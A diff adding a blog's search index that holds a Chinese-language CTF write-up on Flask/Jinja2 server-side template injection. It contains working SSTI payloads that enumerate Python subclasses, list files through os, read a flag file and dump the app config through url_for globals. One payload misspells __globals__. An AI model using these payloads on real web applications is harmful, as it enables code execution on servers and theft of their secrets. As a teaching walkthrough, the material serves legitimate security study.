@@ -1,0 +1,39 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2024/01/06/hello-world/"/>
+    <url>/2024/01/06/hello-world/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>ssti模板注入</title>
+    <link href="/2022/04/15/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
+    <url>/2022/04/15/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
+    
+    <content type="html"><![CDATA[<h2 id="什么是ssti模板注入"><a href="#什么是ssti模板注入" class="headerlink" title="什么是ssti模板注入"></a>什么是ssti模板注入</h2><p>SSTI就是服务器端模板注入(Server-Side Template Injection)。<br>render_template渲染函数的问题，是引发该问题的原因。渲染函数在渲染的时候，往往对用户输入的变量不做渲染。<br>例如，在flask框架中，Jinjia2模板引擎将</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;&#125;&#125;<br></code></pre></td></tr></table></figure><p>包裹的当成变量解析替换。</p><h2 id="常用模板引擎"><a href="#常用模板引擎" class="headerlink" title="常用模板引擎"></a>常用模板引擎</h2><p>网站模板引擎有jinja2、tornado、smarty、twig等等，那么如何判断遇到的是哪种类型，常用图如下。<br><img src="/upload/2022/04/image-c3234947943c4932ad036e47e3c54013.png" alt="image.png"></p><h2 id="常用类"><a href="#常用类" class="headerlink" title="常用类"></a>常用类</h2><p>__class__用来查看变量所属的类<br>__bases__用来查看类的基类。<br><strong>subclasses</strong>()查看当前类的子类。<br><strong>init</strong> 初始化类，返回的类型是function<br><strong>globals</strong> 获取function所处空间下可使用的module、方法以及所有变量。<br>操作例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;//爆出所有能用的类。<br><br></code></pre></td></tr></table></figure><h2 id="Flask特有的变量和函数。"><a href="#Flask特有的变量和函数。" class="headerlink" title="Flask特有的变量和函数。"></a>Flask特有的变量和函数。</h2><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>config 对象就是Flask的config对象，也就是 app.config 对象</p><h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p> Flask中代表当前请求的request对象<br>###session<br> Flask的session对象<br>###url_for()<br>url_for会根据传入的路由器函数名,返回该路由对应的URL,在模板中始终使用url_for()就可以安全的修改路由绑定的URL,则不比担心模板中渲染出错的链接</p><p>###get_flashed_messages()<br>这个函数会返回之前在flask中通过flask()传入的消息的列表，flash函数的作用很简单,可以把由Python字符串表示的消息加入一个消息队列中，再使用get_flashed_message()函数取出它们并消费掉。<br>例题：<br>1.XCTF：Web_python_template_injection<br><img src="/upload/2022/04/image-46c662b8394e48f6a26e8b6bfb721742.png" alt="image.png"><br>Jinjia模板，可以ssti注入。<br>使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<br></code></pre></td></tr></table></figure><p>查出所有的类。<br>使用第72个site._Printer类（可以进行命令执行）<br>使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()<br>[<span class="hljs-number">71</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].listdir(<span class="hljs-string">&#x27;.&#x27;</span>)&#125;&#125;<br>列出所有文件<br></code></pre></td></tr></table></figure><p><img src="/upload/2022/04/image-b563824f1043400b9aa52c2bc7f7913b.png" alt="image.png"></p><p>然后，使用[40]的file类，得到flag。<br><img src="/4" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;fl4g&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>拿到flag.<br><img src="/upload/2022/04/image-577cfcb34d334702bfa27c86cfaac773.png" alt="image.png"></p><p>2.xctf shrine<br>进入查看源码。<br><img src="/upload/2022/04/image-bfa04c70a0c846b181d4211d604999e1.png" alt="image.png"></p><p>源码审计，测试&#x2F;shrine&#x2F;下有回显，但发现过滤 config变量和 self。并且会去除单边括号，所以上题方法失效了。<br>使用url_for函数。<br>url_for.__globals__获取全部全局变量。<br><img src="/upload/2022/04/image-99fc2228abed493ca61310c8b7f2ef85.png" alt="image.png"><br>然后找到app<br>构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__gloabls__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br></code></pre></td></tr></table></figure><p>输入发现flag。<br><img src="/upload/2022/04/image-b563824f1043400b9aa52c2bc7f7913b.png" alt="image.png"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  
+</search>
